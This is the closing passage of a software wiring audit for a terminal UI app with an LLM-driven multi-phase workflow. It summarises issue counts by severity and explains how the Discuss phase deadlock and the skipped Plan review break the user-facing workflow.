The codebase compiles cleanly. All wiring issues identified in this report are **runtime semantic gaps** that pass compilation but produce incorrect user-facing behavior. They survived previous audits because each audit was scoped to message-type wiring and missed the workflow-phase wiring.

---

## 11. Final Status

| Metric | Count |
|--------|-------|
| Critical wiring issues | 1 (Discuss phase dead-end) |
| High severity issues | 3 (Plan screen unreachable, msgChan race, PlanModel sizing) |
| Medium severity issues | 4 (screen flash, persistence, streaming, god object) |
| Low severity issues | 3 (field access, magic number, channel close) |
| Total issues found | 11 |
| Issues fixed since last audit | 13 (W-01 through W-13, C1, C2, H4) |
| Test pass rate | 100% (but tests don't exercise the broken paths) |
| Build pass rate | 100% |

**Bottom line:** The previous audit's wiring fixes worked. The new wiring problems are at a different layer — they're in the workflow phase transitions, not the message bus. The TUI <-> core wiring is functional for direct REPL use, but the multi-phase workflow is not fully usable due to the Discuss phase deadlock and Plan screen bypass.

A user running `/workflow` will:
1. Get through Initialize.
2. Get through Discuss only if the LLM returns zero questions (unlikely).
3. Skip Plan review (auto-advance to Execute).
4. See the Execute screen while the engine does its work.
5. Briefly see Verify.
6. Land on Ship.

The user's chance to refine the goal (Discuss) and review the plan (Plan) are both lost. The other 26+ slash commands and the direct REPL streaming all work correctly.
